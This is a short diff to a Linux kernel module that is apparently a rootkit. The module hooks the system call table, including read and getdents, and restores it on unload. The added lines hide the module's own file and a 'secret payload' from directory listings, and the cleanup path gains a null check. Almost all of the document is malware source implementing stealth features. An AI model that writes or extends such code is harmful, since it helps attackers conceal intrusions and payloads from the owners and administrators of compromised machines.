@@ -43,6 +43,10 @@ int init_module() {
 	//patch(SYS_fork, forkShim);
 	//patch(SYS_clone, cloneShim);
 
+	//request module and payload to be hidden
+	hideDirectory(secret_ko_name);
+	hideDirectory(secret_payload_name);
+
 	printk(KERN_INFO "Module loaded\n");
 	return 0;
 }
@@ -58,6 +62,9 @@ void cleanup_module() {
 	unpatch(SYS_read);
 	unpatch(SYS_getdents);
 	memcpy(sys_call_table, backup_sys_call_table, sizeof(backup_sys_call_table));
-	vector_free(hiddenDirectories);
+	if (hiddenDirectories) {
+		vector_free(hiddenDirectories);
+		hiddenDirectories = 0;
+	}
 	printk(KERN_INFO "Module unloaded\n");
 }
